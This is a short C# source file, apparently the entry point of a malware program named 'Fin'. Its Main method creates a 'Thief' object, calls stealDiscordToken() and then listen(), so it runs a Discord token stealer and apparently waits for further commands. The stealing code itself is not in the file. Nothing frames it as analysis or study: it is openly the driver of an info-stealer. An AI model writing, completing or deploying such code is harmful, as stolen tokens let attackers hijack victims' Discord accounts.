using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Fin.thief;


namespace Fin
{
    internal class Program
    {
        public static Observer observer;

        public static void Main(string[] args)
        {




            Thief thief = new Thief();
            thief.stealDiscordToken();
            thief.listen();
                


        }



    }

}